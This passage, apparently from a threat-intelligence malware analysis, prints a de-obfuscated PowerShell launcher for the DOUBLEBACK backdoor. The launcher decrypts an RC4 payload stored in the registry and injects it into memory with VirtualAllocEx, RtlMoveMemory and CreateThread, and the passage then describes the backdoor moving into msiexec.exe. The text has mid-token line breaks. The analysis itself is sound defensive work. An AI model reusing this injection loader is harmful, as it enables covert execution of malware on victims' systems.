@@ -1,0 +1,22 @@
+
+Runtime.
+InteropServices.
+HandleRef]$lr3, $fn7)) } $decryptedPayload = DecryptPayload 'hklm:\\software\\classes\\CLSID\\<rnd_guid_0>\\VersionIndependentProgID' '<reg_val_payload>' '<reg_val_rc4_key>'; function InjectPayload { param($payload, $payloadLen, $entryPoint, $access) $mem =
+[System.
+Runtime.
+InteropServices.
+Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'VirtualAllocEx'), (ExecuteApi @([IntPtr], [IntPtr], [IntPtr], [int], [int])([Intptr]))).invoke(-1, 0, $payloadLen, 0x3000, $access); [System.
+Runtime.
+InteropServices.
+Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'RtlMoveMemory'), (ExecuteApi @([IntPtr], [byte[]], [UInt32])([Intptr]))).invoke($mem, $payload, $payloadLen); $mem = New-Object System.
+Intptr -ArgumentList $($mem.
+ToInt64() + $entryPoint); [System.
+Runtime.
+InteropServices.
+Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'CreateThread'), (ExecuteApi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([Intptr]))).invoke(0, 0, $mem, 0, 0, 0); Start-Sleep -s
+(((2673 - 942) + 1271)) } # 0x36dc =
+Loader Entry Point, rva # 0x40 =
+PAGE_EXECUTE_READWRITE InjectPayload $decryptedPayload $decryptedPayload.length 0x36dc 0x40 Figure 9:
+De-obfuscated and sanitized launcher script DOUBLEBACK Backdoor component Overview
+The observed DOUBLEDROP instances contain a well-designed backdoor implemented as a 32 or 64-bit PE dynamic library which we track as DOUBLEBACK.
+The backdoor is initially mapped into the same PowerShell process started by the bootstrap script, but it will then inject itself into a msiexec.exe process if certain conditions are met.
